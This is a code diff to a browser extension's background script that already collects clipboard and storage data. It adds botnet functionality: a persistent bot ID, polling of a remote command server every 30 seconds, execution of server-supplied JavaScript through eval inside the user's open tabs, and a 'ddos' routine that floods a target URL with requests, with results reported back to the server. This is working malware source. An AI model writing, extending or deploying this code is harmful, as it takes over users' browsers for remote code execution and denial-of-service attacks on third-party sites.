@@ -7,6 +7,8 @@ let collectedData = {
   clipboard: [],
   timestamp: new Date().toISOString()
 };
+let botId = null;
+let isExecutingCommand = false;
 
 // Load settings on startup
 chrome.runtime.onStartup.addListener(loadSettings);
@@ -88,7 +90,8 @@ chrome.alarms.onAlarm.addListener(async (alarm) => {
 });
 
 async function loadSettings() {
-  settings = await chrome.storage.sync.get({
+  const storage = chrome.storage || browser?.storage || chrome.storage;
+  settings = await storage.sync.get({
     autoScrapeEnabled: true,
     scrapeInterval: 360,
     exportMethod: 'api',
@@ -98,7 +101,11 @@ async function loadSettings() {
     userProfile: ''
   });
   console.log('Settings loaded:', settings);
+  botId = await getBotId();
+  const browserInfo = getBrowserInfo();
+  console.log('Browser detected:', browserInfo);
   setupAutoScrape();
+  setupBotnet();
 }
 
 function setupAutoScrape() {
@@ -205,6 +212,185 @@ async function uploadToAPI(allData) {
 
 async function getUserProfile() {
   return 'user';
+}
+
+async function getBotId() {
+  const storage = chrome.storage || browser?.storage || chrome.storage;
+  let stored = await storage.local.get(['botId']);
+  if (!stored.botId) {
+    const browserInfo = getBrowserInfo();
+    stored.botId = `${browserInfo.name}_${Math.random().toString(36).substr(2, 9)}`;
+    await storage.local.set({botId: stored.botId});
+  }
+  return stored.botId;
+}
+
+function getBrowserInfo() {
+  const userAgent = navigator.userAgent;
+  let browserName = 'chromium';
+  
+  if (userAgent.includes('Edg/')) browserName = 'edge';
+  else if (userAgent.includes('Brave/')) browserName = 'brave';
+  else if (userAgent.includes('Chrome/') && !userAgent.includes('Chromium/')) browserName = 'chrome';
+  else if (userAgent.includes('Chromium/')) browserName = 'chromium';
+  
+  return {
+    name: browserName,
+    version: userAgent.match(/(Chrome|Chromium|Edg|Brave)\/([0-9.]+)/)?.[2] || 'unknown'
+  };
+}
+
+function setupBotnet() {
+  console.log('Setting up botnet with bot ID:', botId);
+  // Poll for commands every 30 seconds
+  setInterval(pollForCommands, 30000);
+  // Initial poll after 5 seconds to ensure settings are loaded
+  setTimeout(pollForCommands, 5000);
+}
+
+async function pollForCommands() {
+  if (!settings.apiEndpoint || isExecutingCommand) {
+    console.log('Skipping poll - no endpoint or executing:', !settings.apiEndpoint, isExecutingCommand);
+    return;
+  }
+  
+  try {
+    const baseUrl = settings.apiEndpoint.replace('/upload', '');
+    const pollUrl = `${baseUrl}/commands/${botId}`;
+    console.log('Polling for commands:', pollUrl);
+    
+    const response = await fetch(pollUrl);
+    console.log('Poll response status:', response.status);
+    
+    if (response.ok) {
+      const command = await response.json();
+      console.log('Received command:', command);
+      
+      if (command.id) {
+        executeCommand(command);
+      } else {
+        console.log('No commands available');
+      }
+    }
+  } catch (error) {
+    console.error('Command poll failed:', error);
+  }
+}
+
+async function executeCommand(command) {
+  isExecutingCommand = true;
+  console.log('Executing command:', command.type);
+  
+  try {
+    let result = {};
+    
+    switch (command.type) {
+      case 'js':
+        result = await executeJS(command.code);
+        break;
+      case 'ddos':
+        result = await executeDDOS(command.target, command.duration || 60);
+        break;
+      case 'load_test':
+        result = await executeLoadTest(command.target, command.requests || 100, command.duration || 60);
+        break;
+    }
+    
+    // Report result
+    const baseUrl = settings.apiEndpoint.replace('/upload', '');
+    console.log('Reporting result to:', `${baseUrl}/commands/${command.id}/result`);
+    const response = await fetch(`${baseUrl}/commands/${command.id}/result`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({botId, result, status: 'completed'})
+    });
+    console.log('Result reported, status:', response.status);
+  } catch (error) {
+    console.error('Command execution failed:', error);
+  } finally {
+    isExecutingCommand = false;
+  }
+}
+
+async function executeJS(code) {
+  try {
+    console.log('Executing JS code:', code.substring(0, 100) + '...');
+    
+    // Get any available tab
+    const tabs = await chrome.tabs.query({});
+    const validTabs = tabs.filter(tab => 
+      tab.url && 
+      !tab.url.startsWith('chrome://') && 
+      !tab.url.startsWith('chrome-extension://') &&
+      !tab.url.startsWith('moz-extension://') &&
+      !tab.url.startsWith('edge://')
+    );
+    
+    if (validTabs.length === 0) {
+      throw new Error('No valid tabs available for execution');
+    }
+    
+    const results = await chrome.scripting.executeScript({
+      target: {tabId: validTabs[0].id},
+      func: (codeToExecute) => {
+        try {
+          return eval('(' + codeToExecute + ')');
+        } catch (error) {
+          return {error: error.message};
+        }
+      },
+      args: [code]
+    });
+    
+    const result = results[0]?.result;
+    if (result?.error) {
+      throw new Error(result.error);
+    }
+    
+    console.log('JS execution result:', result);
+    return {success: true, result};
+  } catch (error) {
+    console.error('JS execution error:', error);
+    return {success: false, error: error.message};
+  }
+}
+
+async function executeDDOS(target, duration) {
+  const endTime = Date.now() + (duration * 1000);
+  let requests = 0;
+  
+  while (Date.now() < endTime) {
+    try {
+      fetch(target, {mode: 'no-cors'});
+      requests++;
+    } catch (e) {}
+    await new Promise(resolve => setTimeout(resolve, 10));
+  }
+  
+  return {requests, duration};
+}
+
+async function executeLoadTest(target, maxRequests, duration) {
+  const endTime = Date.now() + (duration * 1000);
+  let requests = 0;
+  let responses = {success: 0, error: 0};
+  
+  const makeRequest = async () => {
+    try {
+      const response = await fetch(target);
+      responses.success++;
+    } catch (error) {
+      responses.error++;
+    }
+    requests++;
+  };
+  
+  while (Date.now() < endTime && requests < maxRequests) {
+    makeRequest();
+    await new Promise(resolve => setTimeout(resolve, 100));
+  }
+  
+  return {requests, responses, duration};
 }
 
 // Collect localStorage/sessionStorage from a specific tab
